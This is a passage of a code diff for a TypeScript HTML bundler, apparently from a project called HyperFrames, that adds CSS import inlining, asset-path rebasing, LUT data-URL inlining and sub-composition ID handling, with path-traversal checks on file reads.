@@ -1,5 +1,11 @@
+import { markFlattenedInnerRoot } from "../runtime/flattenedRoot";
+export { FLATTENED_INNER_ROOT_STRIP_ATTRS } from "../runtime/flattenedRoot";
+import { parseHostVariableValues, warnUnknownEnumValues } from "../runtime/getVariables";
+import { sanitizeCssValue } from "../runtime/applyVariableBindings";
+import { cssVariableName } from "../tokenSlug";
 import { readFileSync, existsSync } from "fs";
-import { join, resolve, isAbsolute, sep } from "path";
+import { resolve, relative, dirname, isAbsolute, sep } from "path";
+import { CSS_URL_RE, isNonRelativeUrl } from "./assetPaths.js";
 import { transformSync } from "esbuild";
 import { compileHtml, type MediaDurationProber } from "./htmlCompiler";
 import {
@@ -7,22 +13,20 @@ import {
   parseHTMLContent,
   stripEmbeddedRuntimeScripts,
 } from "./htmlDocument";
+// rewriteSubCompPaths functions are used by inlineSubCompositions (shared module)
 import {
-  rewriteAssetPaths,
-  rewriteCssAssetUrls,
-  rewriteInlineStyleAssetUrls,
-} from "./rewriteSubCompPaths";
-import { scopeCssToComposition, wrapScopedCompositionScript } from "./compositionScoping";
+  buildVariablesByCompScript,
+  scopeCssToComposition,
+  wrapInlineScriptWithErrorBoundary,
+  wrapScopedCompositionScript,
+} from "./compositionScoping";
 import { validateHyperframeHtmlContract } from "./staticGuard";
 import { getHyperframeRuntimeScript } from "../generated/runtime-inline";
-
-/** Resolve a relative path within projectDir, rejecting traversal outside it. */
-function safePath(projectDir: string, relativePath: string): string | null {
-  const resolved = resolve(projectDir, relativePath);
-  const normalizedBase = resolve(projectDir) + sep;
-  if (!resolved.startsWith(normalizedBase) && resolved !== resolve(projectDir)) return null;
-  return resolved;
-}
+import { readDeclaredDefaults } from "../runtime/getVariables";
+import { inlineSubCompositions } from "./inlineSubCompositions";
+import { queryByAttr } from "../utils/cssSelector";
+import { isSafePath, resolveWithinProject } from "../safePath.js";
+import { HF_COLOR_GRADING_ATTR } from "../colorGrading";
 
 const DEFAULT_RUNTIME_SCRIPT_URL = "";
 
@@ -54,7 +58,14 @@ function injectInterceptor(html: string, runtimeMode: "inline" | "placeholder" =
     tag = `<script ${RUNTIME_BOOTSTRAP_ATTR}="1">${inlinedRuntime}</script>`;
   }
   if (sanitized.includes("</head>")) {
-    return sanitized.replace("</head>", `${tag}\n</head>`);
+    // Use a function replacer so `String.prototype.replace`'s substitution
+    // patterns (`$&`, `$$`, `$'`, `` $` ``, `$1`–`$99`) inside the inlined
+    // runtime IIFE are passed through verbatim. The minified runtime
+    // contains the literal sequence `$&` as part of legitimate JS, and
+    // the older `(pattern, string)` form would expand it to the matched
+    // `</head>`, silently corrupting the runtime and breaking every
+    // timeline in the bundle with a parse-time SyntaxError.
+    return sanitized.replace("</head>", () => `${tag}\n</head>`);
   }
   const htmlOpenMatch = sanitized.match(/<html\b[^>]*>/i);
   if (htmlOpenMatch?.index != null) {
@@ -70,14 +81,7 @@ function injectInterceptor(html: string, runtimeMode: "inline" | "placeholder" =
 }
 
 function isRelativeUrl(url: string): boolean {
-  if (!url) return false;
-  return (
-    !url.startsWith("http://") &&
-    !url.startsWith("https://") &&
-    !url.startsWith("//") &&
-    !url.startsWith("data:") &&
-    !isAbsolute(url)
-  );
+  return !isNonRelativeUrl(url) && !isAbsolute(url);
 }
 
 function safeReadFile(filePath: string): string | null {
@@ -87,6 +91,167 @@ function safeReadFile(filePath: string): string | null {
   } catch {
     return null;
   }
+}
+
+const CSS_IMPORT_RE =
+  /@import\s+(?:url\(\s*(["']?)([^)"']+)\1\s*\)|(["'])([^"']+)\3)\s*([^;]*);\s*/g;
+
+const CSS_COMMENT_RE = /\/\*[\s\S]*?\*\//g;
+
+function withCommentsStripped<T>(
+  css: string,
+  fn: (stripped: string) => T,
+): { result: T; restore: (s: string) => string } {
+  const comments: string[] = [];
+  const stripped = css.replace(CSS_COMMENT_RE, (m) => {
+    const idx = comments.length;
+    comments.push(m);
+    return `/*__hf_c${idx}__*/`;
+  });
+  const result = fn(stripped);
+  const restore = (s: string) => {
+    let out = s;
+    for (let i = 0; i < comments.length; i++) {
+      out = out.replace(`/*__hf_c${i}__*/`, comments[i]!);
+    }
+    return out;
+  };
+  return { result, restore };
+}
+
+function rebaseCssUrls(css: string, cssFileDir: string, projectDir: string): string {
+  const resolvedRoot = resolve(projectDir);
+  const resolvedDir = resolve(cssFileDir);
+  if (resolvedDir === resolvedRoot) return css;
+  return css.replace(CSS_URL_RE, (full, quote: string, urlValue: string) => {
+    if (!urlValue || !isRelativeUrl(urlValue)) return full;
+    const { basePath, suffix } = splitUrlSuffix(urlValue.trim());
+    if (!basePath) return full;
+    const absolutePath = resolve(resolvedDir, basePath);
+    const rebased = relative(resolvedRoot, absolutePath).split(sep).join("/");
+    if (rebased === basePath) return full;
+    return `url(${quote || ""}${rebased}${suffix}${quote || ""})`;
+  });
+}
+
+function rebaseRelativePath(urlValue: string, fromDir: string, toDir: string): string {
+  const { basePath, suffix } = splitUrlSuffix(urlValue.trim());
+  if (!basePath) return urlValue;
+  const absolutePath = resolve(fromDir, basePath);
+  const rebased = relative(resolve(toDir), absolutePath).split(sep).join("/");
+  return appendSuffixToUrl(rebased, suffix);
+}
+
+function rebaseSrcsetPaths(srcsetValue: string, fromDir: string, toDir: string): string {
+  if (!srcsetValue) return srcsetValue;
+  return srcsetValue
+    .split(",")
+    .map((rawCandidate) => {
+      const candidate = rawCandidate.trim();
+      if (!candidate) return candidate;
+      const parts = candidate.split(/\s+/);
+      const first = parts[0] ?? "";
+      if (parts.length === 0 || !isRelativeUrl(first)) return candidate;
+      parts[0] = rebaseRelativePath(first, fromDir, toDir);
+      return parts.join(" ");
+    })
+    .join(", ");
+}
+
+function rebaseColorGradingLutPath(value: string, fromDir: string, toDir: string): string {
+  if (!value.trim().startsWith("{")) return value;
+  let parsed: unknown;
+  try {
+    parsed = JSON.parse(value);
+  } catch {
+    return value;
+  }
+  if (typeof parsed !== "object" || parsed === null || Array.isArray(parsed)) return value;
+
+  const lut = Reflect.get(parsed, "lut");
+  if (typeof lut === "string") {
+    if (!isRelativeUrl(lut)) return value;
+    Reflect.set(parsed, "lut", rebaseRelativePath(lut, fromDir, toDir));
+    return JSON.stringify(parsed);
+  }
+  if (typeof lut !== "object" || lut === null || Array.isArray(lut)) return value;
+  const lutSrc = Reflect.get(lut, "src");
+  if (typeof lutSrc !== "string" || !isRelativeUrl(lutSrc)) return value;
+  Reflect.set(lut, "src", rebaseRelativePath(lutSrc, fromDir, toDir));
+  return JSON.stringify(parsed);
+}
+
+function rebaseEntryAuthoredAssetPaths(
+  document: Document,
+  sourceDir: string,
+  projectDir: string,
+): void {
+  for (const styleEl of [...document.querySelectorAll("style")]) {
+    styleEl.textContent = rebaseCssUrls(styleEl.textContent || "", sourceDir, projectDir);
+  }
+  for (const el of [...document.querySelectorAll("[style]")]) {
+    const styleAttr = el.getAttribute("style");
+    if (styleAttr) el.setAttribute("style", rebaseCssUrls(styleAttr, sourceDir, projectDir));
+  }
+  for (const el of [...document.querySelectorAll("[src], [href], [poster], [xlink\\:href]")]) {
+    if (el.tagName === "LINK" && (el.getAttribute("rel") || "").toLowerCase() === "stylesheet")
+      continue;
+    if (el.tagName === "SCRIPT" && el.hasAttribute("src")) continue;
+    for (const attr of ["src", "href", "poster", "xlink:href"] as const) {
+      const value = el.getAttribute(attr);
+      if (!value || !isRelativeUrl(value)) continue;
+      el.setAttribute(attr, rebaseRelativePath(value, sourceDir, projectDir));
+    }
+  }
+  for (const el of [...document.querySelectorAll("[srcset]")]) {
+    const srcset = el.getAttribute("srcset");
+    if (srcset) el.setAttribute("srcset", rebaseSrcsetPaths(srcset, sourceDir, projectDir));
+  }
+  for (const el of [...document.querySelectorAll(`[${HF_COLOR_GRADING_ATTR}]`)]) {
+    const value = el.getAttribute(HF_COLOR_GRADING_ATTR);
+    if (value)
+      el.setAttribute(
+        HF_COLOR_GRADING_ATTR,
+        rebaseColorGradingLutPath(value, sourceDir, projectDir),
+      );
+  }
+}
+
+function inlineCssFile(
+  css: string,
+  cssFileDir: string,
+  projectDir: string,
+  visited: Set<string> = new Set(),
+): string {
+  const { result: strippedCss, restore: restoreComments } = withCommentsStripped(css, (s) => s);
+  const importPlaceholders: string[] = [];
+  const withPlaceholders = strippedCss.replace(
+    CSS_IMPORT_RE,
+    (full, _q1, urlPath, _q2, barePath, mediaQuery) => {
+      const importPath = urlPath ?? barePath;
+      if (!importPath || !isRelativeUrl(importPath)) return full;
+      const resolved = resolve(cssFileDir, importPath);
+      // @import is resolved relative to the CSS file, but must stay within the
+      // project root; isSafePath also blocks symlink escapes (content is inlined).
+      if (!isSafePath(projectDir, resolved)) return full;
+      if (visited.has(resolved)) return "";
+      const content = safeReadFile(resolved);
+      if (content == null) return full;
+      visited.add(resolved);
+      const inlined = inlineCssFile(content, dirname(resolved), projectDir, visited);
+      const trimmedMedia = (mediaQuery || "").trim();
+      const block = trimmedMedia ? `@media ${trimmedMedia} {\n${inlined}\n}\n` : inlined + "\n";
+      const idx = importPlaceholders.length;
+      importPlaceholders.push(block);
+      return `/*__hf_import_${idx}__*/`;
+    },
+  );
+  let rebased = rebaseCssUrls(withPlaceholders, cssFileDir, projectDir);
+  rebased = restoreComments(rebased);
+  for (let i = 0; i < importPlaceholders.length; i++) {
+    rebased = rebased.replace(`/*__hf_import_${i}__*/`, importPlaceholders[i]!);
+  }
+  return rebased;
 }
 
 function safeReadFileBuffer(filePath: string): Buffer | null {
@@ -123,31 +288,78 @@ function appendSuffixToUrl(baseUrl: string, suffix: string): string {
   return baseUrl;
 }
 
-function guessMimeType(filePath: string): string {
-  const l = filePath.toLowerCase();
-  if (l.endsWith(".svg")) return "image/svg+xml";
-  if (l.endsWith(".json")) return "application/json";
-  if (l.endsWith(".txt")) return "text/plain";
-  if (l.endsWith(".xml")) return "application/xml";
-  return "application/octet-stream";
-}
-
-function shouldInlineAsDataUrl(filePath: string): boolean {
-  const l = filePath.toLowerCase();
-  return l.endsWith(".svg") || l.endsWith(".json") || l.endsWith(".txt") || l.endsWith(".xml");
-}
+const INLINE_MIME: Record<string, string> = {
+  ".svg": "image/svg+xml",
+  ".json": "application/json",
+  ".txt": "text/plain",
+  ".cube": "text/plain",
+  ".xml": "application/xml",
+};
 
 function maybeInlineRelativeAssetUrl(urlValue: string, projectDir: string): string | null {
   if (!urlValue || !isRelativeUrl(urlValue)) return null;
   const { basePath, suffix } = splitUrlSuffix(urlValue.trim());
   if (!basePath) return null;
-  const filePath = safePath(projectDir, basePath);
-  if (!filePath || !shouldInlineAsDataUrl(filePath)) return null;
+  const filePath = resolveWithinProject(projectDir, basePath);
+  if (!filePath) return null;
+  const ext = filePath.toLowerCase().match(/\.[^.]+$/)?.[0] ?? "";
+  const mimeType = INLINE_MIME[ext];
+  if (!mimeType) return null;
   const content = safeReadFileBuffer(filePath);
   if (content == null) return null;
-  const mimeType = guessMimeType(filePath);
   const dataUrl = `data:${mimeType};base64,${content.toString("base64")}`;
   return appendSuffixToUrl(dataUrl, suffix);
+}
+
+function isExternalSvgFragmentUse(el: Element, attr: string, urlValue: string): boolean {
+  if (el.tagName.toLowerCase() !== "use") return false;
+  if (attr !== "href" && attr !== "xlink:href") return false;
+  if (!isRelativeUrl(urlValue)) return false;
+  const hashIdx = urlValue.indexOf("#");
+  if (hashIdx <= 0) return false;
+  const pathBeforeFragment = urlValue.slice(0, hashIdx).split("?", 1)[0] ?? "";
+  return pathBeforeFragment.toLowerCase().endsWith(".svg");
+}
+
+function warnColorGradingLutNotInlined(lutSrc: string): void {
+  const trimmed = lutSrc.trim();
+  if (!isRelativeUrl(trimmed)) return;
+  console.warn(
+    `[HyperFrames] Could not inline color grading LUT "${trimmed}". The rendered bundle may not be self-contained.`,
+  );
+}
+
+// fallow-ignore-next-line complexity
+function rewriteColorGradingLutWithInlinedAssets(value: string, projectDir: string): string {
+  if (!value.trim().startsWith("{")) return value;
+  let parsed: unknown;
+  try {
+    parsed = JSON.parse(value);
+  } catch {
+    return value;
+  }
+  if (typeof parsed !== "object" || parsed === null || Array.isArray(parsed)) return value;
+
+  const lut = Reflect.get(parsed, "lut");
+  if (typeof lut === "string") {
+    const inlined = maybeInlineRelativeAssetUrl(lut, projectDir);
+    if (!inlined) {
+      warnColorGradingLutNotInlined(lut);
+      return value;
+    }
+    Reflect.set(parsed, "lut", inlined);
+    return JSON.stringify(parsed);
+  }
+  if (typeof lut !== "object" || lut === null || Array.isArray(lut)) return value;
+  const lutSrc = Reflect.get(lut, "src");
+  if (typeof lutSrc !== "string") return value;
+  const inlined = maybeInlineRelativeAssetUrl(lutSrc, projectDir);
+  if (!inlined) {
+    warnColorGradingLutNotInlined(lutSrc);
+    return value;
+  }
+  Reflect.set(lut, "src", inlined);
+  return JSON.stringify(parsed);
 }
 
 function rewriteSrcsetWithInlinedAssets(srcsetValue: string, projectDir: string): string {
@@ -178,12 +390,128 @@ function rewriteCssUrlsWithInlinedAssets(cssText: string, projectDir: string): s
   );
 }
 
+/**
+ * Selectors built here are serialized inside a `<style>` element, which is a RAW
+ * TEXT element: the tokenizer ends it at the first `</style` regardless of CSS
+ * context, and the serializer does not escape its content. Backslash and quote
+ * escaping keeps the selector's own string grammar valid; it does nothing about
+ * element termination, so `<` needs the CSS hex escape too. `\3c ` is legal
+ * wherever a string is, and matches the same attribute value, so selectors keep
+ * matching. The trailing space terminates the escape.
+ */
 function cssAttributeSelector(attr: string, value: string): string {
-  return `[${attr}="${value.replace(/\\/g, "\\\\").replace(/"/g, '\\"')}"]`;
+  const escaped = value.replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/</g, "\\3c ");
+  return `[${attr}="${escaped}"]`;
 }
 
 function uniqueCompositionId(baseId: string, index: number): string {
   return `${baseId}__hf${index}`;
+}
+
+export type BundledHostCompositionIdentity = {
+  authoredCompositionId: string | null;
+  runtimeCompositionId: string | null;
+};
+
+function getBundledHostCompositionIdentity(host: Element): BundledHostCompositionIdentity {
+  const currentCompositionId = (host.getAttribute("data-composition-id") || "").trim() || null;
+  const authoredCompositionId =
+    (host.getAttribute("data-hf-original-composition-id") || currentCompositionId || "").trim() ||
+    null;
+  return {
+    authoredCompositionId,
+    runtimeCompositionId: currentCompositionId,
+  };
+}
+
+function getBundledTrackedCompositionHosts(document: Document): Element[] {
+  const hosts = Array.from(
+    document.querySelectorAll<Element>("[data-composition-src], [data-composition-id]"),
+  );
+  return hosts.filter((host) => {
+    if (host.hasAttribute("data-composition-src")) return true;
+    const authoredCompositionId = getBundledHostCompositionIdentity(host).authoredCompositionId;
+    if (!authoredCompositionId) return false;
+    return !!document.getElementById(`${authoredCompositionId}-template`);
+  });
+}
+
+function shouldAssignBundledRuntimeCompositionId(host: Element, document: Document): boolean {
+  if (host.hasAttribute("data-composition-src")) return true;
+  const authoredCompositionId = getBundledHostCompositionIdentity(host).authoredCompositionId;
+  if (!authoredCompositionId) return false;
+  if (!document.getElementById(`${authoredCompositionId}-template`)) return false;
+  return host.children.length === 0;
+}
+
+function countBundledAuthoredCompositionIds(hosts: Element[]): Map<string, number> {
+  const counts = new Map<string, number>();
+  for (const host of hosts) {
+    const authoredCompositionId = getBundledHostCompositionIdentity(host).authoredCompositionId;
+    if (!authoredCompositionId) continue;
+    counts.set(authoredCompositionId, (counts.get(authoredCompositionId) || 0) + 1);
+  }
+  return counts;
+}
+
+// fallow-ignore-next-line complexity
+export function assignBundledRuntimeCompositionIds(
+  hosts: Element[],
+  counts: Map<string, number> = countBundledAuthoredCompositionIds(hosts),
+): Map<Element, BundledHostCompositionIdentity> {
+  const instanceByCompositionId = new Map<string, number>();
+  const identities = new Map<Element, BundledHostCompositionIdentity>();
+
+  for (const host of hosts) {
+    const { authoredCompositionId, runtimeCompositionId: previousRuntimeCompositionId } =
+      getBundledHostCompositionIdentity(host);
+    const shouldAssign = shouldAssignBundledRuntimeCompositionId(host, host.ownerDocument);
+    if (!authoredCompositionId) {
+      identities.set(host, {
+        authoredCompositionId: null,
+        runtimeCompositionId: previousRuntimeCompositionId,
+      });
+      continue;
+    }
+
+    const duplicateInstance = (counts.get(authoredCompositionId) || 0) > 1;
+    let runtimeCompositionId = previousRuntimeCompositionId || authoredCompositionId;
+    if (shouldAssign) {
+      const instanceIndex = duplicateInstance
+        ? (instanceByCompositionId.get(authoredCompositionId) || 0) + 1
+        : 0;
+      if (duplicateInstance) {
+        instanceByCompositionId.set(authoredCompositionId, instanceIndex);
+        host.setAttribute("data-hf-original-composition-id", authoredCompositionId);
+      } else {
+        host.removeAttribute("data-hf-original-composition-id");
+      }
+
+      runtimeCompositionId = duplicateInstance
+        ? uniqueCompositionId(authoredCompositionId, instanceIndex)
+        : authoredCompositionId;
+      host.setAttribute("data-composition-id", runtimeCompositionId);
+    }
+    identities.set(host, {
+      authoredCompositionId,
+      runtimeCompositionId,
+    });
+  }
+
+  return identities;
+}
+
+export function prepareFlattenedInnerRoot(innerRoot: Element): Element {
+  const prepared = innerRoot.cloneNode(true) as Element;
+  markFlattenedInnerRoot(prepared);
+  const w = prepared.getAttribute("data-width");
+  const h = prepared.getAttribute("data-height");
+  const widthVal = w ? `${w}px` : "100%";
+  const heightVal = h ? `${h}px` : "100%";
+  const existingStyle = (prepared.getAttribute("style") || "").trim();
+  const fill = `width:${widthVal};height:${heightVal}`;
+  prepared.setAttribute("style", existingStyle ? `${existingStyle};${fill}` : fill);
+  return prepared;
 }
 
 function enforceCompositionPixelSizing(document: Document): void {
@@ -258,14 +586,13 @@ function autoHealMissingCompositionIds(document: Document): void {
 function coalesceHeadStylesAndBodyScripts(document: Document): void {
   const headStyleEls = [...document.querySelectorAll("head style")];
   if (headStyleEls.length > 1) {
-    const importRe = /@import\s+url\([^)]*\)\s*;|@import\s+["'][^"']+["']\s*;/gi;
     const imports: string[] = [];
     const cssParts: string[] = [];
     const seenImports = new Set<string>();
     for (const el of headStyleEls) {
       const raw = (el.textContent || "").trim();
       if (!raw) continue;
-      const nonImportCss = raw.replace(importRe, (match) => {
+      const nonImportCss = raw.replace(CSS_IMPORT_RE, (match) => {
         const cleaned = match.trim();
         if (!seenImports.has(cleaned)) {
           seenImports.add(cleaned);
@@ -298,6 +625,27 @@ function coalesceHeadStylesAndBodyScripts(document: Document): void {
       document.body.appendChild(inlineScript);
     }
   }
+}
+
+/**
+ * Force subpixel glyph positioning so headless rendering paths
+ * (chrome-headless-shell with BeginFrame) lay text out identically to full
+ * Chrome. `text-rendering: auto` resolves to `optimizeSpeed` (integer glyph
+ * advances) in headless-shell but `geometricPrecision` in full Chrome, which
+ * shifts line-wrap points and any animation that reads measured text width.
+ * Mirrors the producer's `injectTextRenderingRule` so bundled previews and
+ * compiled renders stay byte-aligned. `*` has zero specificity, so authored
+ * class/id rules still override.
+ */
+function injectTextRenderingRule(document: Document): void {
+  const head = document.head;
+  if (!head) return;
+  if (document.querySelector("style[data-hyperframes-text-rendering]")) return;
+
+  const styleEl = document.createElement("style");
+  styleEl.setAttribute("data-hyperframes-text-rendering", "true");
+  styleEl.textContent = "html,body,*{text-rendering:geometricPrecision}";
+  head.insertBefore(styleEl, head.firstChild);
 }
 
 /**
@@ -336,6 +684,8 @@ function stripJsCommentsParserSafe(source: string): string {
 }
 
 export interface BundleOptions {
+  /** Project-relative HTML entry to bundle. Defaults to `index.html`. */
+  entryFile?: string;
   /** Optional media duration prober (e.g., ffprobe). If omitted, media durations are not resolved. */
   probeMediaDuration?: MediaDurationProber;
   /**
@@ -354,6 +704,12 @@ export interface BundleOptions {
    * modes and emits `<script ... src="<URL>">` directly.
    */
   runtime?: "inline" | "placeholder";
+  /**
+   * Inline .cube LUTs referenced from data-color-grading. Default: true for
+   * self-contained renders/exports. Studio preview disables this so the editor
+   * keeps showing project asset paths instead of giant data URLs.
+   */
+  inlineColorGradingLuts?: boolean;
 }
 
 /**
@@ -365,17 +721,97 @@ export interface BundleOptions {
  * - Inlines sub-composition HTML fragments (data-composition-src)
  * - Inlines small textual assets as data URLs
  */
+
+function ensureExternalScriptTag(doc: Document, src: string): void {
+  if (queryByAttr(doc, "src", src, "script")) return;
+  const el = doc.createElement("script");
+  el.setAttribute("src", src);
+  doc.body.appendChild(el);
+}
+
+function hoistExternalScript(
+  src: string,
+  projectDir: string,
+  doc: Document,
+  seenSrcs: Set<string>,
+  chunks: string[],
+): void {
+  if (seenSrcs.has(src)) return;
+  seenSrcs.add(src);
+  if (!isNonRelativeUrl(src) && !isAbsolute(src)) {
+    const jsPath = resolveWithinProject(projectDir, src);
+    const js = jsPath ? safeReadFile(jsPath) : null;
+    if (js != null) {
+      chunks.push(js);
+      return;
+    }
+  }
+  ensureExternalScriptTag(doc, src);
+}
+
+function hoistCompositionScripts(
+  container: { querySelectorAll: (sel: string) => NodeListOf<Element> },
+  opts: {
+    projectDir: string;
+    document: Document;
+    compId: string | null;
+    runtimeScope: string | undefined;
+    runtimeCompId: string | undefined;
+    authoredRootId: string | undefined;
+    seenCompScriptSrcs: Set<string>;
+    compScriptChunks: string[];
+  },
+): void {
+  for (const scriptEl of [...container.querySelectorAll("script")]) {
+    const externalSrc = (scriptEl.getAttribute("src") || "").trim();
+    if (externalSrc) {
+      hoistExternalScript(
+        externalSrc,
+        opts.projectDir,
+        opts.document,
+        opts.seenCompScriptSrcs,
+        opts.compScriptChunks,
+      );
+    } else {
+      opts.compScriptChunks.push(
+        opts.compId
+          ? wrapScopedCompositionScript(
+              scriptEl.textContent || "",
+              opts.compId,
+              "[HyperFrames] composition script error:",
+              opts.runtimeScope,
+              opts.runtimeCompId || opts.compId,
+              opts.authoredRootId,
+            )
+          : wrapInlineScriptWithErrorBoundary(
+              scriptEl.textContent || "",
+              "[HyperFrames] composition script error:",
+            ),
+      );
+    }
+    scriptEl.remove();
+  }
+}
+
 export async function bundleToSingleHtml(
   projectDir: string,
   options?: BundleOptions,
 ): Promise<string> {
-  const indexPath = join(projectDir, "index.html");
-  if (!existsSync(indexPath)) throw new Error("index.html not found in project directory");
+  const entryFile = options?.entryFile ?? "index.html";
+  const indexPath = resolveWithinProject(projectDir, entryFile);
+  if (!indexPath || !existsSync(indexPath)) {
+    throw new Error(`${entryFile} not found in project directory`);
+  }
+  const sourceDir = dirname(indexPath);
+  const resolveEntryPath = (relativePath: string): string | null => {
+    const resolved = resolve(sourceDir, relativePath);
+    return isSafePath(projectDir, resolved) ? resolved : null;
+  };
 
   const rawHtml = readFileSync(indexPath, "utf-8");
-  const compiled = await compileHtml(rawHtml, projectDir, options?.probeMediaDuration);
+  const compiled = await compileHtml(rawHtml, sourceDir, options?.probeMediaDuration);
 
-  const staticGuard = validateHyperframeHtmlContract(compiled);
+  const staticGuard = await validateHyperframeHtmlContract(compiled);
   if (!staticGuard.isValid) {
     console.warn(
       `[StaticGuard] Invalid HyperFrame contract: ${staticGuard.missingKeys.join("; ")}`,
@@ -385,16 +821,21 @@ export async function bundleToSingleHtml(
   const withInterceptor = injectInterceptor(compiled, options?.runtime ?? "inline");
   const document = parseHTMLContent(withInterceptor);
 
+  if (resolve(sourceDir) !== resolve(projectDir)) {
+    rebaseEntryAuthoredAssetPaths(document, sourceDir, projectDir);
+  }
+
   // Inline local CSS
   const localCssChunks: string[] = [];
   let cssAnchorPlaced = false;
   for (const el of [...document.querySelectorAll('link[rel="stylesheet"]')]) {
     const href = el.getAttribute("href");
     if (!href || !isRelativeUrl(href)) continue;
-    const cssPath = safePath(projectDir, href);
-    const css = cssPath ? safeReadFile(cssPath) : null;
+    const cssPath = resolveEntryPath(href);
+    if (!cssPath) continue;
+    const css = safeReadFile(cssPath);
     if (css == null) continue;
-    localCssChunks.push(css);
+    localCssChunks.push(inlineCssFile(css, dirname(cssPath), projectDir));
     if (!cssAnchorPlaced) {
       const anchor = document.createElement("style");
       anchor.setAttribute("data-hf-bundled-local-css", "1");
@@ -422,7 +863,11 @@ export async function bundleToSingleHtml(
   for (const el of [...document.querySelectorAll("script[src]")]) {
     const src = el.getAttribute("src");
     if (!src || !isRelativeUrl(src)) continue;
-    const jsPath = safePath(projectDir, src);
+    // Module scripts can contain static imports whose resolution is relative
+    // to the script URL. Folding their source into a classic inline script
+    // both drops module semantics and changes the import base URL.
+    if ((el.getAttribute("type") || "").trim().toLowerCase() === "module") continue;
+    const jsPath = resolveEntryPath(src);
     const js = jsPath ? safeReadFile(jsPath) : null;
     if (js == null) continue;
     localJsChunks.push(js);
@@ -448,230 +893,175 @@ export async function bundleToSingleHtml(
     }
   }
 
-  // Inline sub-compositions
-  const compStyleChunks: string[] = [];
+  // Inline sub-compositions (via shared function)
+  const trackedCompositionHosts = getBundledTrackedCompositionHosts(document);
+  const hostIdentityByElement = assignBundledRuntimeCompositionIds(trackedCompositionHosts);
+  const subCompositionHosts = trackedCompositionHosts.filter((host) =>
+    host.hasAttribute("data-composition-src"),
+  );
+  const subCompResult = inlineSubCompositions(document, subCompositionHosts, {
+    resolveHtml: (srcPath: string) => {
+      if (!isRelativeUrl(srcPath)) return null;
+      const compPath = resolveEntryPath(srcPath);
+      return compPath ? safeReadFile(compPath) : null;
+    },
+    parseHtml: parseHTMLContent,
+    hostIdentityMap: hostIdentityByElement,
+    rewriteInlineStyles: true,
+    // A sub-composition's SIBLING assets (`_shared.css` next to it) must be
+    // re-pointed at its own directory when its content moves to the root
+    // document; project-root refs with no such sibling stay as authored.
+    assetExists: (path: string) => {
+      const resolved = resolveEntryPath(path);
+      return resolved !== null && existsSync(resolved);
+    },
+    flattenInnerRoot: prepareFlattenedInnerRoot,
+    readVariableDefaults: readDeclaredDefaults,
+    parseHostVariables: parseHostVariableValues,
+    buildScopeSelector: (compId: string) => cssAttributeSelector("data-composition-id", compId),
+    scriptErrorLabel: "[HyperFrames] composition script error:",
+    onMissingComposition: (srcPath: string, reason?: string) => {
+      console.warn(
+        `[Bundler] Skipping sub-composition "${srcPath}": ${reason ?? "the file could not be found"}.`,
+      );
+    },
+  });
+  const compStyleChunks: string[] = [...subCompResult.styles];
   const compScriptChunks: string[] = [];
-  const compExternalScriptSrcs: string[] = [];
-  const subCompositionHosts = [...document.querySelectorAll("[data-composition-src]")];
-  const hostCountsByCompositionId = new Map<string, number>();
-  for (const hostEl of subCompositionHosts) {
-    const compId = (hostEl.getAttribute("data-composition-id") || "").trim();
-    if (!compId) continue;
-    hostCountsByCompositionId.set(compId, (hostCountsByCompositionId.get(compId) || 0) + 1);
-  }
-  const hostInstanceByCompositionId = new Map<string, number>();
-  for (const hostEl of subCompositionHosts) {
-    const src = hostEl.getAttribute("data-composition-src");
-    if (!src || !isRelativeUrl(src)) continue;
-    const compPath = safePath(projectDir, src);
-    const compHtml = compPath ? safeReadFile(compPath) : null;
-    if (compHtml == null) {
-      console.warn(`[Bundler] Composition file not found: ${src}`);
+  const compExternalLinks = [...subCompResult.externalLinks];
+  const compVariablesByComp: Record<string, Record<string, unknown>> = {
+    ...subCompResult.variablesByComp,
+  };
+  const seenCompScriptSrcs = new Set<string>();
+  for (const scriptItem of subCompResult.scriptItems) {
+    if (scriptItem.kind === "inline") {
+      compScriptChunks.push(scriptItem.content);
       continue;
     }
-
-    const compDoc = parseHTMLContent(compHtml);
-    const compId = hostEl.getAttribute("data-composition-id");
-    const contentRoot = compDoc.querySelector("template");
-    const contentHtml = contentRoot ? contentRoot.innerHTML || "" : compDoc.body.innerHTML || "";
-    const contentDoc = parseHTMLContent(contentHtml);
-    const innerRoot = compId
-      ? contentDoc.querySelector(`[data-composition-id="${compId}"]`)
-      : contentDoc.querySelector("[data-composition-id]");
-    const inferredCompId = innerRoot?.getAttribute("data-composition-id")?.trim() || "";
-    const scopeCompId = compId || inferredCompId;
-    const duplicateInstance = scopeCompId && (hostCountsByCompositionId.get(scopeCompId) || 0) > 1;
-    const instanceIndex = duplicateInstance
-      ? (hostInstanceByCompositionId.get(scopeCompId) || 0) + 1
-      : 0;
-    if (duplicateInstance) hostInstanceByCompositionId.set(scopeCompId, instanceIndex);
-    const runtimeCompId =
-      duplicateInstance && scopeCompId
-        ? uniqueCompositionId(scopeCompId, instanceIndex)
-        : scopeCompId;
-    const runtimeScope = runtimeCompId
-      ? cssAttributeSelector("data-composition-id", runtimeCompId)
-      : "";
-    if (duplicateInstance && runtimeCompId) {
-      hostEl.setAttribute("data-hf-original-composition-id", scopeCompId);
-      hostEl.setAttribute("data-composition-id", runtimeCompId);
-    }
-
-    // When a sub-composition is a full HTML document (no <template>), styles
-    // and scripts in <head> are not part of contentDoc (which only has body
-    // content). Extract them so backgrounds, positioning, fonts, and library
-    // scripts (e.g. GSAP CDN) are not silently dropped.
-    if (!contentRoot && compDoc.head) {
-      for (const s of [...compDoc.head.querySelectorAll("style")]) {
-        const css = rewriteCssAssetUrls(s.textContent || "", src);
-        compStyleChunks.push(
-          scopeCompId ? scopeCssToComposition(css, scopeCompId, runtimeScope) : css,
-        );
-      }
-      for (const s of [...compDoc.head.querySelectorAll("script")]) {
-        const externalSrc = (s.getAttribute("src") || "").trim();
-        if (externalSrc && !compExternalScriptSrcs.includes(externalSrc)) {
-          compExternalScriptSrcs.push(externalSrc);
-        }
+    const extSrc = scriptItem.src;
+    if (seenCompScriptSrcs.has(extSrc)) continue;
+    seenCompScriptSrcs.add(extSrc);
+    if (isRelativeUrl(extSrc)) {
+      const jsPath = resolveEntryPath(extSrc);
+      const js = jsPath ? safeReadFile(jsPath) : null;
+      if (js != null) {
+        compScriptChunks.push(js);
+        continue;
       }
     }
-
-    for (const s of [...contentDoc.querySelectorAll("style")]) {
-      const css = rewriteCssAssetUrls(s.textContent || "", src);
-      compStyleChunks.push(
-        scopeCompId ? scopeCssToComposition(css, scopeCompId, runtimeScope) : css,
-      );
-      s.remove();
+    if (!queryByAttr(document, "src", extSrc, "script")) {
